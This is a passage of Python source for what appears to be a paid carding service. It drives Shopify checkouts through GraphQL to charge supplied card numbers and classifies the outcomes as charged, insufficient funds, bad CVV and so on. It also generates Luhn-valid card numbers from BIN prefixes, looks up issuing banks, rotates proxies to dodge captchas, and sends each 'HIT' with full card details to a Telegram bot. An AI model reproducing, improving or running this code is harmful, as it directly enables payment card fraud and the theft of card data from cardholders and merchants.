__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}",
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [
                            {
                                "destination": {
                                    "partialStreetAddress": {
                                        "address1": street,
                                        "address2": address2,
                                        "city": city,
                                        "countryCode": country_code,
                                        "postalCode": s_zip,
                                        "firstName": firstName,
                                        "lastName": lastName,
                                        "zoneCode": state,
                                        "phone": phone,
                                    },
                                },
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyMatchingConditions": {
                                        "estimatedTimeInTransit": {"any": True},
                                        "shipments": {"any": True},
                                    },
                                    "options": {},
                                },
                                "targetMerchandiseLines": {"any": True},
                                "deliveryMethodTypes": ["SHIPPING"],
                                "expectedTotalPrice": {"any": True},
                                "destinationChanged": True,
                            }
                        ],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [
                            {
                                "stableId": stableId,
                                "merchandise": {
                                    "productVariantReference": {
                                        "id": "gid://shopify/ProductVariantMerchandise/{0}".format(
                                            merch
                                        ),
                                        "variantId": "gid://shopify/ProductVariant/{0}".format(
                                            variant_id
                                        ),
                                        "properties": [],
                                        "sellingPlanId": None,
                                        "sellingPlanDigest": None,
                                    },
                                },
                                "quantity": {"items": {"value": 1}},
                                "expectedTotalPrice": {
                                    "value": {
                                        "amount": subtotal,
                                        "currencyCode": currency,
                                    },
                                },
                                "lineComponentsSource": None,
                                "lineComponents": [],
                            }
                        ],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "",
                                "address2": "",
                                "city": "",
                                "countryCode": country_code,
                                "postalCode": "",
                                "firstName": "",
                                "lastName": "",
                                "zoneCode": "",
                                "phone": "",
                            },
                        },
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": currency,
                            "countryCode": country_code,
                        },
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {
                            "value": {"amount": "0", "currencyCode": currency}
                        },
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            resp = await self.session.post(
                graphql_url, json=shipping_json, headers=headers
            )
            await asyncio.sleep(3)
            resp = await self.session.post(
                graphql_url, json=shipping_json, headers=headers
            )
            try:
                shipping_resp = await resp.json(content_type=None)
            except Exception as je:
                raw = await resp.text() if hasattr(resp, "text") else ""
                return False, f"Shipping response parse error: {je}", {}

            # Guard: check for top-level errors or missing data key
            if "data" not in shipping_resp:
                gql_errors = shipping_resp.get("errors", [])
                err_msg = (
                    gql_errors[0].get("message", "Unknown GraphQL error")
                    if gql_errors
                    else "No data in shipping response"
                )
                return False, f"Shipping request failed: {err_msg}", {}

            negotiate = (
                (shipping_resp.get("data") or {})
                .get("session", {})
                .get("negotiate", {})
            )
            result_type = (negotiate.get("result") or {}).get("__typename", "")

            # Handle Throttled — wait and retry once
            if result_type == "Throttled":
                poll_after = (negotiate.get("result") or {}).get("pollAfter", 5)
                await asyncio.sleep(max(float(poll_after), 5))
                resp = await self.session.post(
                    graphql_url, json=shipping_json, headers=headers
                )
                shipping_resp = await resp.json()
                if "data" not in shipping_resp:
                    return False, "Shipping throttled and retry failed", {}
                negotiate = (
                    (shipping_resp.get("data") or {})
                    .get("session", {})
                    .get("negotiate", {})
                )

            if (negotiate.get("result") or {}).get(
                "__typename"
            ) == "NegotiationResultFailed":
                return False, "Shipping negotiation failed", {}

            try:
                seller = shipping_resp["data"]["session"]["negotiate"]["result"][
                    "sellerProposal"
                ]
                delivery_data = seller["delivery"]
                running_total = seller["runningTotal"]["value"]["amount"]

                if delivery_data.get("__typename") == "PendingTerms":
                    delivery_strategy = ""
                    shipping_amount = 0.0
                else:
                    strategies = delivery_data.get("deliveryLines", [{}])[0].get(
                        "availableDeliveryStrategies", []
                    )
                    if strategies:
                        delivery_strategy = strategies[0]["handle"]
                        shipping_amount = strategies[0]["amount"]["value"]["amount"]
                    else:
                        delivery_strategy = ""
                        shipping_amount = 0.0

                tax_data = seller.get("tax", {})
                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    tax_amount = (
                        tax_data.get("totalTaxAmount", {})
                        .get("value", {})
                        .get("amount", "0")
                    )
                else:
                    try:
                        tax_amount = seller["tax"]["totalTaxAmount"]["value"]["amount"]
                    except (KeyError, TypeError):
                        tax_amount = "0"

                payment_methods = seller.get("payment", {}).get(
                    "availablePaymentLines", []
                )
                paymentmethodidentifier = None
                payment_name = "Credit Card"
                for pm_line in payment_methods:
                    pm = pm_line.get("paymentMethod", {})
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        paymentmethodidentifier = pid
                        payment_name = pm.get("extensibilityDisplayName") or pm.get(
                            "name", "Credit Card"
                        )
                        break
                if not paymentmethodidentifier:
                    paymentmethodidentifier = self.extract_between(
                        text, "paymentMethodIdentifier&quot;:&quot;", "&quot;"
                    ) or self.extract_between(text, '"paymentMethodIdentifier":"', '"')

            except (KeyError, TypeError, IndexError) as e:
                return False, f"Error parsing shipping response: {str(e)}", {}

            # Step 2: Delivery proposal — confirm delivery strategy + billing address
            import copy as _copy

            delivery_json = _copy.deepcopy(shipping_json)
            delivery_json["variables"]["delivery"]["deliveryLines"][0][
                "selectedDeliveryStrategy"
            ] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy or "",
                    "customDeliveryRate": False,
                },
                "options": {},
            }
            delivery_json["variables"]["delivery"]["deliveryLines"][0][
                "targetMerchandiseLines"
            ] = {"lines": [{"stableId": stableId}]}
            delivery_json["variables"]["delivery"]["deliveryLines"][0][
                "expectedTotalPrice"
            ] = {"value": {"amount": str(shipping_amount), "currencyCode": currency}}
            delivery_json["variables"]["delivery"]["deliveryLines"][0][
                "destinationChanged"
            ] = False
            delivery_json["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": b_street,
                    "address2": "",
                    "city": b_city,
                    "countryCode": b_country,
                    "postalCode": b_zip,
                    "firstName": b_first,
                    "lastName": b_last,
                    "zoneCode": b_state,
                    "phone": b_phone,
                }
            }
            delivery_json["variables"]["taxes"]["proposedTotalAmount"]["value"][
                "amount"
            ] = str(tax_amount)
            delivery_json["variables"]["buyerIdentity"]["shopPayOptInPhone"][
                "number"
            ] = phone

            await self.session.post(graphql_url, json=delivery_json, headers=headers)

            formatted_card = " ".join([cc[i : i + 4] for i in range(0, len(cc), 4)])
            token_payload = {
                "credit_card": {
                    "month": mes,
                    "name": f"{b_first} {b_last}",
                    "number": formatted_card,
                    "verification_value": cvv,
                    "year": ano,
                },
                "payment_session_scope": f"www.{urlparse(base_url).netloc}",
            }

            token_resp = await self.session.post(
                "https://deposit.shopifycs.com/sessions", json=token_payload
            )

            try:
                payment_token = (await token_resp.json())["id"]
            except:
                return False, "Unable to get payment token - Invalid card format", {}

            completion_json = {
                "query": "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on ActionRequiredReceipt{id __typename}}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on ActionRequiredReceipt{id __typename}}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on ActionRequiredReceipt{id __typename}}__typename}}}",
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken": queueToken,
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [
                                {
                                    "destination": {
                                        "streetAddress": {
                                            "address1": street,
                                            "address2": address2,
                                            "city": city,
                                            "countryCode": country_code,
                                            "postalCode": s_zip,
                                            "firstName": firstName,
                                            "lastName": lastName,
                                            "zoneCode": state,
                                            "phone": phone,
                                        },
                                    },
                                    "selectedDeliveryStrategy": {
                                        "deliveryStrategyByHandle": {
                                            "handle": delivery_strategy,
                                            "customDeliveryRate": False,
                                        },
                                        "options": {"phone": phone},
                                    },
                                    "targetMerchandiseLines": {
                                        "lines": [{"stableId": stableId}],
                                    },
                                    "deliveryMethodTypes": ["SHIPPING"],
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": shipping_amount,
                                            "currencyCode": currency,
                                        },
                                    },
                                    "destinationChanged": False,
                                }
                            ],
                            "noDeliveryRequired": [],
                            "useProgressiveRates": True,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping": True,
                        },
                        "deliveryExpectations": {"deliveryExpectationLines": []},
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": stableId,
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                            "properties": [],
                                            "sellingPlanId": None,
                                            "sellingPlanDigest": None,
                                        },
                                    },
                                    "quantity": {"items": {"value": 1}},
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": subtotal,
                                            "currencyCode": currency,
                                        },
                                    },
                                    "lineComponentsSource": None,
                                    "lineComponents": [],
                                }
                            ],
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": paymentmethodidentifier,
                                            "sessionId": payment_token,
                                            "billingAddress": {
                                                "streetAddress": {
                                                    "address1": b_street,
                                                    "address2": "",
                                                    "city": b_city,
                                                    "countryCode": b_country,
                                                    "postalCode": b_zip,
                                                    "firstName": b_first,
                                                    "lastName": b_last,
                                                    "zoneCode": b_state,
                                                    "phone": b_phone,
                                                },
                                            },
                                            "cardSource": None,
                                        },
                                    },
                                    "amount": {
                                        "value": {
                                            "amount": running_total,
                                            "currencyCode": currency,
                                        },
                                    },
                                    "dueAt": None,
                                }
                            ],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": b_street,
                                    "address2": "",
                                    "city": b_city,
                                    "countryCode": b_country,
                                    "postalCode": b_zip,
                                    "firstName": b_first,
                                    "lastName": b_last,
                                    "zoneCode": b_state,
                                    "phone": b_phone,
                                },
                            },
                        },
                        "buyerIdentity": {
                            "customer": {
                                "presentmentCurrency": currency,
                                "countryCode": country_code,
                            },
                            "email": email,
                            "emailChanged": False,
                            "phoneCountryCode": country_code,
                            "marketingConsent": [{"email": {"value": email}}],
                            "shopPayOptInPhone": {
                                "number": phone,
                                "countryCode": country_code,
                            },
                            "rememberMe": False,
                        },
                        "tip": {"tipLines": []},
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {
                                "value": {
                                    "amount": tax_amount,
                                    "currencyCode": currency,
                                },
                            },
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": [],
                        },
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {
                            "signature": None,
                            "signatureUuid": None,
                            "lineItemScriptChanges": [],
                            "paymentScriptChanges": [],
                            "shippingScriptChanges": [],
                        },
                        "optionalDuties": {"buyerRefusesDuties": False},
                    },
                    "attemptToken": attempt_token,
                    "metafields": [],
                    "analytics": {"requestUrl": checkout_url},
                },
                "operationName": "SubmitForCompletion",
            }

            resp = await self.session.post(
                graphql_url, json=completion_json, headers=headers
            )
            text = await resp.text()

            if "Your order total has changed." in text:
                # Shopify updated the total (tax/shipping adjustment).
                # Try to pull the new amount from the response and retry once.
                new_total = None
                try:
                    import json as _json_mod
                    rj = _json_mod.loads(text)
                    # Walk the full JSON looking for a totalAmount.amount field
                    def _find_total(obj):
                        if isinstance(obj, dict):
                            if "totalAmount" in obj:
                                ta = obj["totalAmount"]
                                if isinstance(ta, dict) and "amount" in ta:
                                    return ta["amount"]
                            for v in obj.values():
                                r = _find_total(v)
                                if r:
                                    return r
                        elif isinstance(obj, list):
                            for item in obj:
                                r = _find_total(item)
                                if r:
                                    return r
                        return None
                    new_total = _find_total(rj)
                except Exception:
                    pass

                # Fallback: regex scan for first decimal amount in the text
                if not new_total:
                    import re as _re
                    m = _re.search(r'"amount"\s*:\s*"(\d+\.\d+)"', text)
                    if m:
                        new_total = m.group(1)

                if new_total and new_total != running_total:
                    # Patch both the payment line and the outer totalAmount
                    running_total = new_total
                    completion_json["variables"]["input"]["payment"]["paymentLines"][0][
                        "amount"
                    ]["value"]["amount"] = running_total
                    # retry
                    resp2 = await self.session.post(
                        graphql_url, json=completion_json, headers=headers
                    )
                    text = await resp2.text()
                    if "Your order total has changed." in text:
                        return False, "Site not supported - Total changed", {}
                else:
                    return False, "Site not supported - Total changed", {}

            if "The requested payment method is not available." in text:
                return False, "Payment method not available", {}

            def _parse_submit_result(rj, raw):
                """Return (receipt_id, error_msg). One of them will be None."""
                try:
                    sub = rj["data"]["submitForCompletion"]
                    tname = sub.get("__typename", "")
                    if tname in (
                        "SubmitSuccess",
                        "SubmitAlreadyAccepted",
                        "SubmittedForCompletion",
                    ):
                        return sub["receipt"]["id"], None
                    if tname == "SubmitFailed":
                        reason = sub.get("reason") or "Unknown reason"
                        return None, f"Submit Failed | {reason}"
                    if tname == "SubmitRejected":
                        errs = sub.get("errors") or []
                        if errs:
                            e = errs[0]
                            msg = (
                                e.get("localizedMessage")
                                or e.get("nonLocalizedMessage")
                                or e.get("code")
                                or str(e)
                            )
                            return None, f"Rejected | {msg}"
                        return None, "Rejected | No error details"
                    if tname:
                        return None, f"Unexpected result | {tname}"
                except Exception:
                    pass
                # Top-level GQL errors
                gql_errs = rj.get("errors") if isinstance(rj, dict) else None
                if gql_errs:
                    return (
                        None,
                        f"GQL Error | {gql_errs[0].get('message', str(gql_errs[0]))[:300]}",
                    )
                # Last resort: snippet of raw text
                snippet = raw.replace("\n", " ")[:300] if raw else "empty response"
                return None, f"Parse Error | {snippet}"

            if "CAPTCHA_METADATA_MISSING" in text:
                return False, "Captcha required - Use better proxies", {}
            if "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE" in text:
                return False, "Invalid CVV | CVV invalid for card type", {}

            try:
                import json as _j
                resp_json = _j.loads(text)
            except Exception:
                resp_json = {}

            receipt_id, err_msg = _parse_submit_result(resp_json, text)

            if receipt_id is None:
                # One retry
                await asyncio.sleep(5)
                resp = await self.session.post(
                    graphql_url, json=completion_json, headers=headers
                )
                text = await resp.text()
                if (
                    "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE"
                    in text
                ):
                    return False, "Invalid CVV | CVV invalid for card type", {}
                try:
                    resp_json = _j.loads(text)
                except Exception:
                    resp_json = {}
                receipt_id, err_msg = _parse_submit_result(resp_json, text)
                if receipt_id is None:
                    return False, err_msg or "Error processing card", {}

            await asyncio.sleep(5)

            poll_json = {
                "query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}} __typename}}}",
                "variables": {
                    "receiptId": receipt_id,
                    "sessionToken": sst,
                },
                "operationName": "PollForReceipt",
            }

            for i in range(3):
                resp = await self.session.post(
                    graphql_url, json=poll_json, headers=headers
                )
                text = await resp.text()

                if "WaitingReceipt" not in text:
                    break

                await asyncio.sleep(5)

            if "WaitingReceipt" in text:
                return False, "Timeout - Change proxy or site", {}

            resp_json = await resp.json()

            result_info = {
                "amount": running_total,
                "currency": currency,
                "gateway": payment_name,
                "email": email,
            }

            # Detect poll-level GQL errors (schema/validation errors) before processing
            poll_gql_errors = (
                resp_json.get("errors") if isinstance(resp_json, dict) else None
            )
            if poll_gql_errors and not (
                isinstance(resp_json.get("data"), dict)
                and resp_json["data"].get("receipt")
            ):
                err_msg = poll_gql_errors[0].get("message", str(poll_gql_errors[0]))[
                    :300
                ]
                return False, f"Poll GQL Error | {err_msg}", result_info

            typename = ""
            try:
                typename = resp_json["data"]["receipt"].get("__typename", "")
            except Exception:
                pass

            if not typename:
                if "ProcessedReceipt" in text:
                    typename = "ProcessedReceipt"
                elif "FailedReceipt" in text:
                    typename = "FailedReceipt"
                elif "ActionRequiredReceipt" in text:
                    typename = "ActionRequiredReceipt"
                elif "WaitingReceipt" in text:
                    typename = "WaitingReceipt"

            if typename == "ActionRequiredReceipt" or "actionreq" in text.lower():
                return False, "3D Secure - Action Required", result_info

            if typename == "ProcessedReceipt":
                return True, "Charged Successfully", result_info

            # FailedReceipt or unknown — extract error code + human message
            code = ""
            message_untranslated = ""
            try:
                proc_err = resp_json["data"]["receipt"].get("processingError") or {}
                code = proc_err.get("code", "") or ""
                message_untranslated = proc_err.get("messageUntranslated", "") or ""
            except Exception:
                pass

            if not code:
                code = (
                    self.extract_between(text, '"code":"', '"')
                    or self.extract_between(text, '{"code":"', '"')
                    or ""
                )
            if not message_untranslated:
                message_untranslated = (
                    self.extract_between(text, '"messageUntranslated":"', '"') or ""
                )

            error_detail = message_untranslated or code or "Unknown Error"
            text_lower = text.lower()
            code_lower = code.lower()

            msg_lower = message_untranslated.lower()

            if (
                any(k in code_lower for k in ["insufficient_funds", "insufficient"])
                or "insufficient" in msg_lower
                or "insufficient_funds" in text_lower
            ):
                return (
                    True,
                    f"Approved - Insufficient Funds | {error_detail}",
                    result_info,
                )
            elif (
                any(
                    k in code_lower
                    for k in ["invalid_cvc", "incorrect_cvc", "security_code"]
                )
                or any(k in msg_lower for k in ["security code", "cvv", "cvc"])
                or any(k in text_lower for k in ["invalid_cvc", "incorrect_cvc"])
            ):
                return True, f"Invalid CVV | {error_detail}", result_info
            elif (
                any(k in code_lower for k in ["zip", "postal"])
                or any(k in msg_lower for k in ["zip", "postal"])
                or any(k in text_lower for k in ["zip_code", "postal_code"])
            ):
                return True, f"Invalid ZIP | {error_detail}", result_info
            elif (
                any(
                    k in code_lower
                    for k in ["invalid_number", "incorrect_number", "invalid_card"]
                )
                or any(k in msg_lower for k in ["card number", "invalid number"])
                or any(k in text_lower for k in ["invalid_number", "incorrect_number"])
            ):
                return False, f"Invalid CCN | {error_detail}", result_info
            elif any(
                k in code_lower
                for k in ["do_not_honor", "card_declined", "generic_decline"]
            ):
                return False, f"Declined | {error_detail}", result_info
            else:
                return False, f"Declined | {error_detail}", result_info

        except Exception as e:
            return False, f"Error: {str(e)}", {}
        finally:
            if self.session:
                await self.session.close()


def parse_proxy_string(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{proxy_str}"
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    return None


def country_flag_emoji(code):
    if not code or len(code) < 2:
        return ""
    code = code.upper()[:2]
    try:
        return chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397)
    except Exception:
        return ""


async def bin_lookup_async(bin_number):
    bin6 = re.sub(r"\D", "", bin_number)[:6]
    if len(bin6) < 6:
        return {}

    result = {}

    def _parse_handyapi(d):
        if d.get("Status") != "SUCCESS":
            return None
        c = d.get("Country") or {}
        return {
            "scheme": d.get("Scheme", ""),
            "type": d.get("Type", ""),
            "level": d.get("CardTier", ""),
            "bank": d.get("Issuer", ""),
            "country_code": c.get("A2", ""),
            "country_name": c.get("Name", ""),
        }

    def _parse_binlist(d):
        c = d.get("country") or {}
        b = d.get("bank") or {}
        return {
            "scheme": d.get("scheme", ""),
            "type": d.get("type", ""),
            "level": d.get("brand", ""),
            "bank": b.get("name", ""),
            "country_code": c.get("alpha2", ""),
            "country_name": c.get("name", ""),
        }

    def _parse_bincodes(d):
        if not d.get("valid") and d.get("error"):
            return None
        return {
            "scheme": d.get("card", ""),
            "type": d.get("type", ""),
            "level": d.get("level", ""),
            "bank": d.get("bank", ""),
            "country_code": d.get("countrycode", ""),
            "country_name": d.get("country", ""),
        }

    apis = [
        (f"https://data.handyapi.com/bin/{bin6}", _parse_handyapi),
        (f"https://lookup.binlist.net/{bin6}", _parse_binlist),
        (
            f"https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin6}",
            _parse_bincodes,
        ),
    ]

    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=6),
            headers={"Accept": "application/json", "User-Agent": "Mozilla/5.0"},
        ) as session:
            for url, parser in apis:
                try:
                    async with session.get(url) as resp:
                        if resp.status == 200:
                            data = await resp.json(content_type=None)
                            parsed = parser(data)
                            if parsed:
                                for k, v in parsed.items():
                                    if v and not result.get(k):
                                        result[k] = v
                                if all(
                                    result.get(k) for k in ["scheme", "type", "bank"]
                                ):
                                    break
                except Exception:
                    continue
    except Exception:
        pass

    return result


async def send_telegram_hit(bot_str, card_str, status, message, info, bin_info):
    try:
        if "::" not in bot_str:
            return
        token, chat_id = bot_str.split("::", 1)
        token = token.strip()
        chat_id = chat_id.strip()
        if not token or not chat_id:
            return

        currency = (info or {}).get("currency", "USD")
        amount = (info or {}).get("amount", "0.00")
        gateway = (info or {}).get("gateway", "Shopify Payments")

        try:
            price = f"${float(amount):.2f}"
        except Exception:
            price = f"${amount}"

        flag = country_flag_emoji(bin_info.get("country_code", ""))
        country_name = (bin_info.get("country_name", "") or "Unknown").upper()
        country_str = f"{country_name} {flag}".strip()

        if status == "CHARGED":
            response_str = "Order completed 💎"
        elif status == "CVV":
            response_str = message
        else:
            response_str = message

        now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

        text = (
            f"💎 HIT DETECTED! 💎\n\n"
            f"Card: {card_str}\n"
            f"Status: {status}\n"
            f"Gateway: {gateway}\n"
            f"Response: {response_str}\n"
            f"Price: {price}\n\n"
            f"BIN Info:\n"
            f"• Brand: {(bin_info.get('scheme') or 'Unknown').upper()}\n"
            f"• Type: {(bin_info.get('type') or 'Unknown').upper()}\n"
            f"• Level: {(bin_info.get('level') or 'Unknown').upper()}\n"
            f"• Bank: {(bin_info.get('bank') or 'Unknown').upper()}\n"
            f"• Country: {country_str or 'Unknown'}\n\n"
            f"Time: {now}"
        )

        url = f"https://api.telegram.org/bot{token}/sendMessage"
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=connector, timeout=aiohttp.ClientTimeout(total=10)
        ) as session:
            await session.post(url, json={"chat_id": chat_id, "text": text})
    except Exception:
        pass


def luhn_checksum(card_number):
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10


def generate_card_number(bin_prefix):
    bin_prefix = bin_prefix.replace(" ", "").replace("-", "")
    remaining = 15 - len(bin_prefix)
    random_digits = "".join(random.choices(string.digits, k=remaining))
    partial = bin_prefix + random_digits
    for check_digit in range(10):
        if luhn_checksum(partial + str(check_digit)) == 0:
            return partial + str(check_digit)
    return partial + "0"


@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get("authenticated"):
        return redirect("/")

    if request.method == "POST":
        key = (request.form.get("key") or "").strip().upper()
        nonce = request.form.get("nonce", "")
        if nonce != session.get("login_nonce", ""):
            nonce_val = secrets.token_hex(16)
            session["login_nonce"] = nonce_val
            return render_template(
                "login.html",
                error="Invalid request — please try again.",
                nonce=nonce_val,
            )

        now = datetime.datetime.utcnow()
        with _keys_lock:
            entry = VALID_KEYS.get(key)

        # If not in memory (e.g. after a restart), check the DB directly
        if not entry:
            entry = _db_lookup_key(key)
            if entry:
                with _keys_lock:
                    VALID_KEYS[key] = entry   # re-cache it

        if entry and entry["expiry"] > now:
            session["authenticated"] = True
            session["key"] = key
            session.permanent = True
            return redirect("/")
        elif entry:
            with _keys_lock:
                VALID_KEYS.pop(key, None)
            _db_delete_key(key)

        nonce_val = secrets.token_hex(16)
        session["login_nonce"] = nonce_val
        return render_template(
            "login.html", error="Invalid or expired key.", nonce=nonce_val
        )

    nonce_val = secrets.token_hex(16)
    session["login_nonce"] = nonce_val
    return render_template("login.html", error=None, nonce=nonce_val)


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


@app.route("/nonce")
def refresh_nonce():
    nonce_val = secrets.token_hex(16)
